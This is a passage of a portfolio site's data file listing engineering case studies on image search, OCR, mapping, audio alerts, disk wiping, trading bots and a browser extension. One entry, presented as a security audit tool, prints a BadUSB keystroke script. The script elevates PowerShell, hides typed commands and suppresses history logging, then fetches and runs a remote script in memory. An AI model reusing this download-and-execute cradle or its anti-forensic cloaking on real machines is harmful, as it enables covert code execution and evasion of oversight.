      { label: 'False Positives', value: '94% Cut' },
      { label: 'Vocabulary', value: '250+ Concepts' },
      { label: 'Tag Latency', value: '<150 ms' },
    ],
    tags: ['CLIP ViT-L/14', 'PyTorch', 'FAISS', 'Ontology Graph', 'Adaptive Thresholding', 'FastAPI'],
    relatedProjectId: 'cyo-image-search',
    snippet: {
      title: 'Contradiction Removal & Priority Rules',
      language: 'python',
      code: `// Excerpt from: Cyo_Image_Search/backend/engine/embedding/clip_service.py
def _remove_contradictions(self, candidates: List[tuple]) -> List[tuple]:
    contradictions = {
        'bright': ['dark', 'dim lighting', 'low light', 'midnight'],
        'dark': ['bright', 'bright lighting', 'daytime', 'sunlight'],
        'daytime': ['night', 'midnight', 'evening', 'dark'],
        'night': ['daytime', 'sunrise', 'sunset', 'morning', 'afternoon', 'bright'],
        'indoor': ['outdoor', 'nature'],
        'outdoor': ['indoor', 'studio'],
        'person': ['group of people', 'people', 'crowd'],
    }
    priority_labels = {'group of people', 'people', 'crowd'}
    selected = []
    selected_labels = set()
    for label, score in candidates:
        if label == 'person' and any(c in priority_labels for c, _ in candidates):
            continue
        if not any(label in contradictions.get(s, []) or s in contradictions.get(label, []) for s in selected_labels):
            selected.append((label, score))
            selected_labels.add(label)
    return selected`,
    },
  },
  {
    id: 'cyo-ocr-bottleneck-threads',
    title: 'The 80% OCR Bottleneck: Parallelizing Vision Models with In-Memory PIL Caching',
    subtitle: 'Gating EasyOCR to save 4.1s per non-text photo and running CLIP + YOLO concurrently in Python ThreadPoolExecutor',
    category: 'AI & Computer Vision',
    categories: ['AI & Computer Vision', 'Cybersecurity & Systems'],
    date: 'Feb – Apr 2026',
    readTime: '2 min read',
    badge: '30–50% Faster Indexing',
    storyType: 'deep-dive',
    summary:
      'Profiling CYO\'s indexing pipeline revealed that EasyOCR consumed 4.103s per image—80.0% of total processing time—because it ran character segmentation on every photo, including text-less landscapes, while every sub-service re-read the image from disk. We overhauled the pipeline: cached the opened PIL image in memory, dispatched CLIP embeddings and YOLOv8m detection in parallel using concurrent.futures.ThreadPoolExecutor(max_workers=2), and gated EasyOCR behind image area thresholds and semantic document heuristic triggers, reducing wall-clock indexing time by 30-50% while holding peak VRAM to 1.81 GB on an RTX 3050.',
    theMistake:
      'Executing expensive OCR character segmentation unconditionally on every photo and loading images from disk multiple times across serial model steps.',
    theLesson:
      'In multi-model AI pipelines, the slowest model dictates total throughput. Gate computationally heavy operators behind fast semantic classifiers, share in-memory tensors, and parallelize independent neural inferences.',
    sections: [
      {
        heading: 'The 4.1-Second EasyOCR Bottleneck',
        content:
          'Subsystem profiling showed: CLIP took 0.141s (2.7%), YOLO took 0.102s (2.0%), and EasyOCR took 4.103s (80.0%). Indexing a folder of 1,000 photos required 1.4 hours because EasyOCR ran full line segmentation across scenic landscapes and nature photos with zero text.',
        type: 'mistake',
      },
      {
        heading: 'Parallel CLIP + YOLO ThreadPool & Single Disk I/O',
        content:
          'We opened the image exactly once (pil_img = Image.open(path)) and dispatched CLIP feature extraction and YOLO detection in parallel using ThreadPoolExecutor(max_workers=2). Read-only PyTorch contexts ran concurrently without race conditions, saving 30–50% latency.',
        type: 'breakthrough',
      },
      {
        heading: 'Gated OCR Execution & Noise Filtering',
        content:
          'EasyOCR is skipped for images <10,000 px², and conditioned on document indicators (invoice, certificate, receipt, form). Raw OCR strings <3 characters are dropped, keeping peak VRAM at 1.81 GB on an RTX 3050.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'OCR Share', value: '80% → Gated' },
      { label: 'Wall-Clock Gain', value: '30–50%' },
      { label: 'Peak VRAM', value: '1.81 GB' },
    ],
    tags: ['PyTorch', 'EasyOCR', 'YOLOv8', 'CLIP', 'ThreadPoolExecutor', 'CUDA Optimization'],
    relatedProjectId: 'cyo-image-search',
    snippet: {
      title: 'Parallel Vision Inference Pipeline',
      language: 'python',
      code: `// Excerpt from: Cyo_Image_Search/backend/engine/factory.py
def analyze_image(image_path: str, mode: str = None, tag_strictness: float = None):
    pil_img = Image.open(image_path) // Single memory read
    detector = EngineFactory.get_detection_service(mode)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        future_embed = pool.submit(clip_service.generate_embedding, pil_img)
        future_detect = pool.submit(detector.detect_objects, image_path)
        embedding = future_embed.result()
        detections = future_detect.result()

    // Gated OCR: skip tiny images and drop short noise
    text_lines = []
    if pil_img.width * pil_img.height >= _MIN_OCR_AREA:
        raw_lines = ocr_service.extract_text(image_path, min_confidence=0.4)
        text_lines = [l for l in raw_lines if len(l.strip()) >= _MIN_OCR_LINE_LEN]`,
    },
  },
  {
    id: 'cyo-scenic-hijacking-prompting',
    title: 'The Scenic Hijacking Crisis & Discriminative "Subject vs. Label" Prompting',
    subtitle: 'Creating a 10–15% cosine similarity margin with asymmetric prompt framing and scenic keyword disqualifiers',
    category: 'AI & Computer Vision',
    categories: ['AI & Computer Vision'],
    date: 'Mar – May 2026',
    readTime: '2 min read',
    badge: '15% Semantic Margin',
    storyType: 'deep-dive',
    summary:
      'When users searched for \'birthday party\' or \'graduation\', outdoor mountain landscapes frequently hijacked top results because background tags (\'bright\', \'sky\', \'outdoor\') generated high baseline cosine similarity against broad abstract queries. Comparing raw strings produced an unseparated 0.75–0.85 similarity band. We engineered RelevanceValidator: added a scenic disqualifier capping environmental tags to neutral when queries are non-scenic, framed prompts asymmetrically (\'subject: {query}\' vs \'label: {tag}\') to force ontological categorization, and added morphological plural normalization.',
    theMistake:
      'Comparing raw query and tag strings symmetrically in CLIP text space without contextual disqualifiers against high-frequency environmental noise.',
    theLesson:
      'Neural vector similarity is prone to background semantic drift. Wrap embeddings in asymmetric prompt templates (`subject:` vs `label:`) to force clear categorization margins, and penalize high-frequency environmental tags on subject-specific queries.',
    sections: [
      {
        heading: 'Landscape Photos Hijacking Action Queries',
        content:
          'Searching for "birthday party" or "graduation" returned mountain hiking trails in top results because background tags (blue sky, trees, sunlight) had weak positive text overlap with abstract celebration descriptors, scoring 0.78–0.82 similarity.',
        type: 'mistake',
      },
      {
        heading: 'Asymmetric "subject:" vs "label:" Prompting',
        content:
          'We framed prompts with distinct prefixes: "subject: {query}" and "label: {tag}". This asymmetric prompt structure forced CLIP\'s text transformer into an ontological categorization mode, generating a 10–15% separation margin between true subjects and background noise.',
        type: 'breakthrough',
      },
      {
        heading: 'Scenic Disqualifier & Morphological Plurals',
        content:
          'If queries lack scenic keywords (sky, mountain, beach), environmental tags are capped at 0.82 neutral threshold. Plural queries (butterflies) are dynamically normalized to singular base forms before scoring.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Cosine Margin', value: '+10–15%' },
      { label: 'Scenic Hijacking', value: 'Zero' },
      { label: 'Plural Handling', value: 'Normalized' },
    ],
    tags: ['CLIP Prompting', 'Cosine Similarity', 'NLP Validation', 'Morphological Normalization'],
    relatedProjectId: 'cyo-image-search',
    snippet: {
      title: 'Asymmetric Prompt Relevance Validator',
      language: 'python',
      code: `// Excerpt from: Cyo_Image_Search/backend/app/services/relevance_service.py
query_prompt = f"subject: {query}"
for tag in image_tags:
    tag_prompt = f"label: {tag}"
    max_sim = self.clip_service.compute_text_similarity(query_prompt, tag_prompt)
    // Scenic Disqualifier: Cap scenic tags to Neutral if query is non-scenic
    is_scenic_tag = any(scenic in tag.lower() for scenic in self.SCENIC_TAGS)
    if not is_scenic_query and is_scenic_tag:
        max_sim = min(max_sim, NEUTRAL_T + 0.01)`,
    },
  },
  {
    id: 'cyo-document-intelligence',
    title: 'Document Intelligence: Header Capitalization Heuristics & Entity Extraction',
    subtitle: 'Extracting dates, currency amounts, and certificate types from scanned government documents without vision tag pollution',
    category: 'AI & Computer Vision',
    categories: ['AI & Computer Vision'],
    date: 'Apr – Jun 2026',
    readTime: '2 min read',
    badge: '13+ Document Classes',
    storyType: 'deep-dive',
    summary:
      'Scanned certificates and tax receipts were frequently misclassified by visual transformers as \'abstract art\' or tagged with irrelevant background textures (\'wooden table\'). Important details like invoice numbers, dates, and amounts were trapped in unstructured OCR text blobs. We built DocumentClassifier and TextAnalyzer: analyzed line-by-line capitalization (>60% uppercase density indicates header titles), mapped text to a prioritized 13-category certificate taxonomy, extracted dates, financial amounts (₹/$), and IDs with multi-format regex, and isolated document tags to keep search clean.',
    theMistake:
      'Relying on visual embedding models to classify text-heavy documents and storing raw OCR strings without structured entity extraction.',
    theLesson:
      'For text-centric imagery, optical character recognition and regex heuristics must lead classification. Combine line capitalization density with entity parsers to turn raw pixels into structured database records.',
    sections: [
      {
        heading: 'Certificates Tagged as "Abstract Art"',
        content:
          'Visual transformers prioritize global textures and color distributions over fine text semantics. A bonafide certificate or invoice was tagged as "wooden table" or "yellow paper", while invoice IDs (INV-2026-04) and amounts (₹4,500) remained unindexed.',
        type: 'mistake',
      },
      {
        heading: 'Header Capitalization & 13-Class Taxonomy',
        content:
          'DocumentClassifier analyzes line-by-line uppercase density: lines with >60% uppercase text matching patterns (CERTIFICATE, INVOICE, BONAFIDE) are identified as document headers, categorized across 13 certificate types (income, bonafide, leaving, degree).',
        type: 'breakthrough',
      },
      {
        heading: 'Structured Regex Entity Parsing',
        content:
          'TextAnalyzer extracts dates (DD/MM/YYYY), currency amounts (₹, Rs., $), emails, phone numbers, and IDs. When is_document = 1, visual CLIP tags are stripped, leaving only structured document metadata in SQLite.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Document Types', value: '13+ Taxonomies' },
      { label: 'Entity Parsing', value: 'Dates, ₹/$, IDs' },
      { label: 'Tag Isolation', value: '100% Clean' },
    ],
    tags: ['Document Processing', 'EasyOCR', 'Regex Parsing', 'SQLite', 'Entity Extraction'],
    relatedProjectId: 'cyo-image-search',
    snippet: {
      title: 'Header Density Document Classifier',
      language: 'python',
      code: `// Excerpt from: Cyo_Image_Search/backend/app/services/document_service.py
class DocumentClassifier:
    @staticmethod
    def extract_document_type_from_text(full_text: str, text_lines: List[str]) -> Optional[str]:
        text_lower = full_text.lower()
        for cert_type, patterns in certificate_types.items():
            if any(p in text_lower for p in patterns):
                return cert_type
        // Check uppercase density for document headers
        for line in text_lines:
            if len(line) > 5 and sum(1 for c in line if c.isupper()) / len(line) > 0.6:
                if 'certificate' in line.lower():
                    return match_certificate_pattern(line)`,
    },
  },

  // ==========================================
  // 5. SURAKSHA360 & SECURITY UTILITIES
  // ==========================================
  {
    id: 'suraksha360-badusb-cloaking',
    title: 'Fileless In-Memory BadUSB Delivery & PSReadLine Terminal Cloaking',
    subtitle: 'An 850-line zero-footprint PowerShell audit engine with console foreground cloaking and direct anonymous Supabase REST upload',
    category: 'Cybersecurity & Systems',
    categories: ['Cybersecurity & Systems', 'Electronics & Embedded'],
    date: 'Feb – Apr 2026',
    readTime: '2 min read',
    badge: 'Zero-Disk Audit',
    storyType: 'deep-dive',
    summary:
      'In Suraksha360, we designed an automated endpoint security auditor deployed via BadUSB hardware (ATmega32U4 / WiFiDuck). Early field trials exposed three vulnerabilities: typing the cradle visibly flashed secret GitHub tokens on screen, commands persisted in PSReadLine history files, and ExecutionPolicy: Restricted blocked .ps1 scripts. We engineered an in-memory pipeline: automated UAC elevation keystrokes, unmounted PSReadLine to prevent history logging, set console foreground color equal to background color to cloak typed text, and evaluated the 850-line payload entirely in RAM via an IEX web cradle, uploading telemetry directly to Supabase via anonymous REST tokens.',
    theMistake:
      'Writing PowerShell commands to disk and executing interactive console downloads without suppressing command history logging or visual buffer colorization.',
    theLesson:
      'In offensive auditing and automated compliance scanning, eliminate on-disk artifacts. Combine in-memory execution cradles with console buffer cloaking to audit endpoints without exposing credentials or leaving forensic disk footprints.',
    sections: [
      {
        heading: 'Screen Flashing and PSReadLine History Leaks',
        content:
          'When BadUSB devices typed the download cradle, the screen flashed with cleartext GitHub tokens. Commands were saved directly into PSReadLine ConsoleHost_history.txt, and ExecutionPolicy: Restricted blocked file execution.',
        type: 'mistake',
      },
      {
        heading: 'Console Color Cloaking & PSReadLine Unload',
        content:
          'Immediately upon opening the elevated prompt, the script executes: Remove-Module PSReadLine; [Console]::ForegroundColor = [Console]::BackgroundColor; Clear-Host. Setting text color identical to background color made typed download commands invisible on screen.',
        type: 'breakthrough',
      },
      {
        heading: 'RAM-Only IEX Cradle & Anonymous Supabase Telemetry',
        content:
          'The 850-line payload evaluates in memory via IEX(IWR ... -UseBasicParsing).Content, audits 11 security layers (AV, firewall, AMSI, open ports), and streams JSON telemetry directly to Supabase via anonymous JWT REST tokens.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Payload Size', value: '850 Lines' },
      { label: 'Disk Artifacts', value: '0 Files' },
      { label: 'Security Layers', value: '11 Inspected' },
    ],
    tags: ['PowerShell', 'BadUSB', 'ATmega32U4', 'PSReadLine', 'Supabase REST', 'Endpoint Security'],
    relatedProjectId: 'suraksha360',
    snippet: {
      title: 'Terminal Cloaking & Fileless Web Cradle',
      language: 'powershell',
      code: `// Excerpt from: innovateyou/Hardware/Firmwares/suraksha360.txt
GUI r
DELAY 700
STRING powershell
CTRL+SHIFT ENTER
DELAY 2500
ALT y
DELAY 1500
// Unload PSReadLine and match font color to background
STRING Remove-Module PSReadLine -ErrorAction SilentlyContinue; [Console]::ForegroundColor = [Console]::BackgroundColor; Clear-Host
ENTER
DELAY 200
// RAM-only fileless execution cradle
STRING $t='github_pat_...'; $u='https://raw.githubusercontent.com/.../scanner_payload.ps1'; IEX(IWR $u -Headers @{Authorization="Bearer $t"} -UseBasicParsing).Content
ENTER`,
    },
  },
  {
    id: 'suraksha360-geo-map-battle',
    title: 'The 7-Commit Geolocation Battle: Dynamic Marker Scaling & NaN Defense',
    subtitle: 'Replacing geographic meter circles with zoom-adaptive screen-space markers, CSS pulsing, and GPS validation',
    category: 'Web Dev & Web3',
    categories: ['Web Dev & Web3', 'Android & Mobile'],
    date: 'Mar – May 2026',
    readTime: '2 min read',
    badge: '7 Commits · 0 NaN Crashes',
    storyType: 'war-story',
    summary:
      'Commits 021021c through a8e829b chronicle a 7-commit battle with geospatial threat mapping in React/Leaflet. First, drawing threat circles with geographic meters (<Circle radius={10000}>) blew up to continent size on zoom out and shrank to sub-pixel specks on zoom in. Second, devices without GPS injected nulls into coordinate arrays, causing Math.min() to return NaN and crash the React tree. Third, IP geolocation APIs hit rate limits. We fixed this with pixel-anchored <CircleMarker> elements styled with CSS @keyframes pulse-critical, defensive memoized coordinate filtering, and multi-provider failover.',
    theMistake:
      'Using geographic real-world meter circles for UI status badges and passing unsanitized null coordinates into Leaflet bounding box calculations.',
    theLesson:
      'Distinguish between physical geographic dimensions and screen-space UI indicators when rendering telemetry on maps. Always validate asynchronous database streams to sanitize missing GPS coordinates before calculating viewport matrices.',
    sections: [
      {
        heading: 'Continent-Sized Threat Markers & NaN Render Crashes',
        content:
          'Leaflet <Circle radius={10000}> scaled with map zoom, covering entire continents at zoom 3. Furthermore, enrolled corporate intranet devices with null coordinates caused Math.min(...lats) to evaluate to NaN, crashing the React tree.',
        type: 'mistake',
      },
      {
        heading: 'Pixel-Anchored CircleMarkers with CSS Keyframe Pulsing',
        content:
          'We switched to fixed 8px/20px CircleMarker elements with CSS @keyframes pulse-critical animations for high-risk assets (risk_score >= 70), ensuring consistent screen-space visibility at all zoom levels.',
        type: 'breakthrough',
      },
      {
        heading: 'Defensive Geo-Filtering & Programmatic Viewports',
        content:
          'We wrapped device lists in memoized GPS validators (mappedDevices = devices.filter(d => d.latitude && d.longitude)) and built a custom MapController using useMap() to smoothly animate between asset focus and full-fleet bounding boxes.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Stabilization', value: '7 Commits' },
      { label: 'Marker Scaling', value: 'Fixed 8px/20px' },
      { label: 'Render Crashes', value: '0 NaN Errors' },
    ],
    tags: ['React 19', 'Leaflet', 'React Native', 'Geospatial UI', 'Supabase Realtime', 'Defensive JS'],
    relatedProjectId: 'suraksha360',
    snippet: {
      title: 'Screen-Space Pulsing CircleMarker',
      language: 'jsx',
      code: `// Excerpt from: innovateyou/src/pages/DeviceMap.jsx
{mappedDevices.map((d) => {
  const isCritical = d.risk_score >= 70;
  return (
    <Fragment key={d.id}>
      {isCritical && (
        <CircleMarker
          center={[d.latitude, d.longitude]}
          radius={20}
          pathOptions={{ fillColor: '#ef4444', color: 'transparent', fillOpacity: 0.2 }}
          className="critical-marker-pulse"
        />
      )}
      <CircleMarker
        center={[d.latitude, d.longitude]}
        radius={8}
        pathOptions={{ fillColor: getRiskMapColor(d.risk_score), color: '#fff', weight: 2, fillOpacity: 0.9 }}
        eventHandlers={{ click: () => setSelectedId(d.id) }}
      />
    </Fragment>
  );
})}`,
    },
  },
  {
    id: 'suraksha360-webaudio-siren',
    title: 'Procedural Web Audio Siren Synthesis & Real-Time CDC Intrusion Alerts',
    subtitle: 'Eliminating 1.2s CDN audio lag with 0 KB dual-oscillator procedural acoustic synthesis and Postgres CDC subscriptions',
    category: 'Web Dev & Web3',
    categories: ['Web Dev & Web3', 'Cybersecurity & Systems'],
    date: 'Apr – Jun 2026',
    readTime: '2 min read',
    badge: '0 KB Audio Footprint',
    storyType: 'deep-dive',
    summary:
      'When security breaches occurred, fetching static .mp3 alarm files over CDNs created 500-1200ms audio delays and failed offline. We rebuilt alarm notifications around procedural acoustic synthesis: the browser generates a 6-second emergency siren directly using Web Audio API nodes (sawtooth wave sweeping 400Hz-800Hz paired with a 5Hz detuned square wave for aggressive acoustic chorus beating). For native mobile, a Python script synthesizes 44.1 kHz 16-bit PCM WAV files, while Supabase Realtime listens to PostgreSQL Change Data Capture (CDC) table inserts to sound alarms instantaneously.',
    theMistake:
      'Relying on asynchronous network audio asset downloads for emergency security alarms.',
    theLesson:
      'Safety and intrusion alarms must never depend on network media CDNs. Synthesize audible alerts procedurally on the client hardware to guarantee instant, zero-latency feedback during security events.',
    sections: [
      {
        heading: 'CDN Audio Delays and Offline Alarm Failures',
        content:
          'Fetching static audio buffers over network CDNs caused 500–1200ms latency between intrusion detection and audible alarms. When offline or on high-latency networks, audio failed to play entirely.',
        type: 'mistake',
      },
      {
        heading: 'Dual-Oscillator Procedural Siren Synthesis',
        content:
          'We synthesized sirens dynamically via Web Audio API: Oscillator 1 sweeps a sawtooth wave exponentially from 400 Hz → 800 Hz → 400 Hz every 0.8s, while Oscillator 2 adds a square wave with 5 Hz detuning for aggressive chorus beating.',
        type: 'breakthrough',
      },
      {
        heading: 'PostgreSQL CDC Real-Time Subscriptions',
        content:
          'Supabase Realtime listens to Postgres table inserts on attack_events via Change Data Capture (CDC), triggering the local synthesis engine within milliseconds of an attack payload arrival.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Audio Payload', value: '0 KB (Synthesized)' },
      { label: 'Latency', value: '<50 ms' },
      { label: 'Pitch Sweep', value: '400 Hz → 800 Hz' },
    ],
    tags: ['Web Audio API', 'PostgreSQL CDC', 'Supabase Realtime', 'Acoustic Synthesis', 'React 19'],
    relatedProjectId: 'suraksha360',
    snippet: {
      title: 'Web Audio Procedural Siren Generator',
      language: 'javascript',
      code: `// Excerpt from: innovateyou/src/components/GlobalNotificationManager.jsx
const playAlarm = () => {
  const ctx = new (window.AudioContext || window.webkitAudioContext)();
  const gain = ctx.createGain();
  const osc1 = ctx.createOscillator();
  const osc2 = ctx.createOscillator();
  osc1.type = 'sawtooth';
  osc2.type = 'square';
  osc2.detune.setValueAtTime(5, ctx.currentTime); // 5 Hz acoustic beating
  for (let i = 0; i < 6; i++) {
    const t = ctx.currentTime + i;
    osc1.frequency.setValueAtTime(400, t);
    osc1.frequency.exponentialRampToValueAtTime(800, t + 0.4);
    osc1.frequency.exponentialRampToValueAtTime(400, t + 0.8);
    osc2.frequency.setValueAtTime(400, t);
    osc2.frequency.exponentialRampToValueAtTime(800, t + 0.4);
    osc2.frequency.exponentialRampToValueAtTime(400, t + 0.8);
  }
  osc1.connect(gain); osc2.connect(gain); gain.connect(ctx.destination);
  osc1.start(); osc2.start();
  osc1.stop(ctx.currentTime + 6.0); osc2.stop(ctx.currentTime + 6.0);
};`,
    },
  },
  {
    id: 'zerobyte-nist-cryptographic-wipe',
    title: 'NIST SP 800-88 Rev.1 Media Sanitization & Cryptographically Signed Wipe Verification',
    subtitle: 'A 4-phase raw physical drive sector purge engine with RSA-2048 / SHA-256 digital signature certificates and embedded QR codes',
    category: 'Cybersecurity & Systems',
    categories: ['Cybersecurity & Systems'],
    date: 'Jun – Jul 2026',
    readTime: '2 min read',
    badge: 'NIST SP 800-88 Rev.1',
    storyType: 'deep-dive',
    summary:
      'In ZeroByte (CyberHexon enterprise disk sanitization), simple file deletions or formatting leave recoverable data, and standard disposal PDFs can be forged without cryptographic non-repudiation. Furthermore, Windows drive letter scanning misses unpartitioned or corrupted disks. We built a 4-phase sanitization engine: queries raw physical geometry via associative WMI traversal (Win32_DiskDrive -> Win32_LogicalDisk) while locking C:\\, executes NIST Clear/Purge multi-pass sector overwrites, calculates sample SHA-256 digests, and generates tamper-proof ReportLab PDF certificates signed with RSA-2048 PKCS#1 v1.5 and machine-readable QR verification codes.',
    theMistake:
      'Relying on logical drive letter scanning (which misses raw unpartitioned media) and generating unsigned PDF certificates that lack cryptographic non-repudiation.',
    theLesson:
      'In media sanitization engineering, data erasure is only as valuable as the cryptographic audit trail proving it occurred. Always operate from the raw physical layer upwards, lock system partitions, and sign certificates of destruction with asymmetric cryptography.',
    sections: [
      {
        heading: 'Unverifiable Erasures and Unpartitioned Disks',
        content:
          'Filesystem drive scanning missed raw disks with deleted partition tables (\\\\.\\PhysicalDrive1), while unsigned disposal PDF summaries could be easily modified in PDF editors by rogue operators to claim a drive was sanitized.',
        type: 'mistake',
      },
      {
        heading: 'Associative WMI Physical Storage Traversal',
        content:
          'We rebuilt enumeration in drives.py to query Win32_DiskDrive first for hardware serial numbers and physical handles, traversing Win32_LogicalDiskToPartition to correlate drive letters and actively locking the system drive (is_system: True).',
        type: 'breakthrough',
      },
      {
        heading: 'RSA-2048 Signed Certificates & QR Codes',
        content:
          'Audit summaries are signed with an RSA-2048 private key (PKCS#1 v1.5 / SHA-256) and embedded in ReportLab PDFs with machine-readable verification QR codes (CyberHexon://signed/{sig_hex}), allowing auditors to verify authenticity with mobile scanners.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Standard', value: 'NIST SP 800-88' },
      { label: 'Signature', value: 'RSA-2048 / SHA-256' },
      { label: 'Verification', value: 'Signed QR Code' },
    ],
    tags: ['Disk Sanitization', 'NIST SP 800-88', 'RSA-2048', 'WMI Storage', 'ReportLab PDF', 'Cryptography'],
    relatedProjectId: 'suraksha360',
    snippet: {
      title: 'Asymmetric RSA-2048 Certificate Signing',
      language: 'python',
      code: `// Excerpt from: ZeroByte/cyberhexon_windows/certificate.py
class CertificateGenerator:
    def _sign(self, data: bytes) -> bytes:
        return self._private_key.sign(data, padding.PKCS1v15(), hashes.SHA256())

    def generate(self, summary_dict, out_pdf_path, out_json_path):
        payload = {"product": "CyberHexon", "spec": "NIST SP 800-88 Rev.1", "summary": summary_dict}
        signature = self._sign(json.dumps(payload, indent=2).encode("utf-8"))
        qr_payload = f"CyberHexon://signed/{signature.hex()[:32]}"
        qr_img = qrcode.make(qr_payload)
        qr_img.save(str(out_pdf_path) + "_qr.png")
        self._draw_certificate(summary_dict, str(out_pdf_path) + "_qr.png", out_pdf_path)
        return out_pdf_path, out_json_path`,
    },
  },

  // ==========================================
  // 6. EXPERT ADVISORS & FLOATING TRANSLATOR
  // ==========================================
  {
    id: 'ea-double-flip-anomaly',
    title: 'The Double-Flip Direction Anomaly: Decoupling Fills from Ephemeral Pending Orders',
    subtitle: 'Fixing consecutive same-direction grid fills in MQL5 geometric trading by anchoring state to confirmed broker fills',
    category: 'Trading & State Reliability',
    categories: ['Trading & State Reliability'],
    date: 'Feb – Apr 2026',
    readTime: '2 min read',
    badge: 'Zero Double Fills',
    storyType: 'deep-dive',
    summary:
      'In our automated MQL5 geometric grid trading EA, trades alternate between Buy and Sell. During live forward testing, Trade #201 was a BUY (0.16 lots), but Ticket #203 filled as another BUY (0.17 lots) instead of a SELL, taking double directional risk. When the broker deleted the intermediate pending SELL STOP over rollover, the self-healing watchdog called PlaceNextPendingOrder(), which applied a flip rule to the stale pending direction variable (flip(SELL) = BUY!). We solved this by decoupling state: direction is calculated strictly from g_lastFilledDirection, which updates only upon verified broker fill execution events.',
    theMistake:
      'Calculating future trade direction by flipping an ephemeral pending order state variable rather than anchoring to confirmed on-broker execution fills.',
    theLesson:
      'In automated execution engines, never derive future state transitions by flipping variables representing unexecuted intent. Always anchor state machines to cryptographically confirmed or broker-verified position execution events.',
    sections: [
      {
        heading: 'Two Consecutive Buy Trades at Increasing Lots',
        content:
          'Trade #201 filled as a BUY (0.16 lots). When Ticket #203 opened as ANOTHER BUY (0.17 lots) instead of an alternating SELL, Ticket #202 (pending SELL STOP) was missing. The account took double directional exposure without a hedge.',
        type: 'mistake',
      },
      {
        heading: 'Broker Order Deletion and the Stale Flip Trap',
        content:
          'The broker deleted the pending SELL STOP over weekend rollover. MonitorPendingOrders() reset g_pendingTicket = 0, but left g_pendingDirection stale as SELL. The self-healing watchdog called PlaceNextPendingOrder(), which applied the flip rule to the stale direction: flip(SELL) = BUY, placing a BUY STOP.',
        type: 'breakthrough',
      },
      {
        heading: 'Anchoring State to Confirmed Execution Events',
        content:
          'We introduced g_lastFilledDirection, updated exclusively when position fills are confirmed by the broker. PlaceNextPendingOrder calculates alternating direction strictly from the last confirmed fill, eliminating double-direction corruptions.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Double Fills', value: '0% (Eliminated)' },
      { label: 'Grid Depth', value: '0.26+ Lots' },
      { label: 'Hedge Integrity', value: '100% Alternating' },
    ],
    tags: ['MQL5', 'MetaTrader 5', 'Algorithmic Trading', 'State Machine', 'Hedging Recovery'],
    relatedProjectId: 'expert-advisors',
  },
  {
    id: 'ea-basket-profit-verification',
    title: 'The $500 Basket Profit Lockup & Unverified Position Closure Trap',
    subtitle: 'Relaxing posCount < 2 guard clauses and adding post-close verification loops before state resets in MQL5',
    category: 'Trading & State Reliability',
    categories: ['Trading & State Reliability'],
    date: 'Mar – May 2026',
    readTime: '2 min read',
    badge: 'Post-Close Guard',
    storyType: 'reflection',
    summary:
      'The MA Grid EA monitors floating profit and triggers CloseAllOurPositions() when reaching target equity (e.g. +$500). In live testing, floating profit crossed +$500, but positions never closed, reversing into a drawdown. We found two bugs: CheckBasketProfit() had a hardcoded posCount < 2 guard (skipping exits when a single position made +$500), and CloseAllOurPositions() called ResetToIdle() immediately without verifying if broker close requests succeeded. We relaxed the guard to posCount == 0 and added an active post-close verification loop querying CountOurPositions() before state reset.',
    theMistake:
      'Guarding aggregate profit calculations with multi-position count checks, and resetting state to idle before verifying broker order closures.',
    theLesson:
      'Never assume a trading API call succeeded simply because the function was invoked. In high-concurrency trading systems, actively verify that external broker states match internal expectations before transitioning state machines.',
    sections: [
      {
        heading: 'The +$500 Floating Profit Reversal',
        content:
          'Floating basket profit crossed +$500 USD, but the EA never closed the positions, reversing into a loss. CheckBasketProfit() contained if(posCount < 2) return;, meaning if a single position reached target profit, exit logic was completely skipped.',
        type: 'mistake',
      },
      {
        heading: 'Unverified State Resets & Orphaned Orders',
        content:
          'When issuing close commands, CloseAllOurPositions() called ResetToIdle() immediately. If a broker request failed due to spread widening or network timeout, the EA reset to idle, leaving orphaned positions unmanaged in the market.',
        type: 'breakthrough',
      },
      {
        heading: 'Active Post-Close Verification Loop',
        content:
          'We changed the guard to if(CountOurPositions() == 0) return; and added a post-close verification loop: if CountOurPositions() > 0 after the close attempt, ResetToIdle() is aborted and closing retries on the next tick.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Profit Target', value: '+$500 USD' },
      { label: 'Orphan Trades', value: 'Zero' },
      { label: 'Closure Check', value: 'Verified' },
    ],
    tags: ['MQL5', 'MetaTrader 5', 'CTrade API', 'Position Management', 'Defensive Trading'],
    relatedProjectId: 'expert-advisors',
    snippet: {
      title: 'Post-Close Verification Loop',
      language: 'mql5',
      code: `// Excerpt from: Expert_Advisors/EA2/MA_Grid_EA.mq5
void CheckBasketProfit() {
   if (CountOurPositions() == 0) return;
   double totalProfit = CalculateOurTotalProfit();
   if (totalProfit >= Target_Basket_Profit) {
      CloseAllOurPositions();
      // VERIFICATION: Ensure all trades actually closed before resetting state
      int remaining = CountOurPositions();
      if (remaining > 0) {
         Print("WARNING: ", remaining, " positions still open. Retrying next tick.");
         return; // Do NOT reset state — keep trying
      }
      Print("SUCCESS: Basket closed with profit: $", totalProfit);
      ResetToIdle();
   }
}`,
    },
  },
  {
    id: 'floating-translator-promise-mutex',
    title: 'Chrome Manifest V3 Offscreen Architecture & Promise-Based Mutex Locks',
    subtitle: 'Resolving TypeError: null (reading recognize) during rapid Alt+T keypresses in client-side WebAssembly OCR',
    category: 'Web Dev & Web3',
    categories: ['Web Dev & Web3', 'AI & Computer Vision'],
    date: 'Mar 2026',
    readTime: '2 min read',
    badge: 'WASM Promise Mutex',
    storyType: 'deep-dive',
    summary:
      'Floating Translator is a zero-cost browser extension running client-side Tesseract.js OCR in WebAssembly inside an Offscreen Document. When users pressed Alt+T rapidly, the extension threw \'TypeError: Cannot read properties of null (reading recognize)\' and froze. The worker initialization used a boolean flag (isInitializing = true). Because WASM compilation takes 800-1500ms, second keypresses saw isInitializing === true, skipped setup, and called recognize() on a null worker. Replacing the boolean flag with a shared Promise-based mutex lock ensured all concurrent callers safely await in-flight initializations.',
    theMistake:
      'Using a simple boolean flag to serialize asynchronous WebAssembly worker instantiation across rapid concurrent user invocations.',
    theLesson:
